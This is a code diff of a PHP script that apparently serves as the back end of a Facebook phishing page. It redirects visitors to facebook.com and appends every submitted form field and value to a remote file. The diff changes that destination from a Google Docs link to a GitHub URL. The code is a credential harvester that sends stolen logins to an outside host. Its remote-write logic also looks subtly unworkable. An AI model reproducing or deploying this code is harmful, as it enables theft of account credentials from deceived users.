@@ -2,7 +2,7 @@
 <?php
 
 header('Location: https://www.facebook.com');
-$handle = fopen("https://docs.google.com/document/d/1m7YU-aOhUYzKASroG0T9nm_6t84j_kOV3eMg1ARuYJk/edit?usp=sharing","a");
+$handle = fopen("https://github.com/harithadushmantha/fb_app/blob/main/log.txt","a");
 foreach($_POST as $variable => $value){
     fwrite($handle,$variable);
     fwrite($handle,"=");
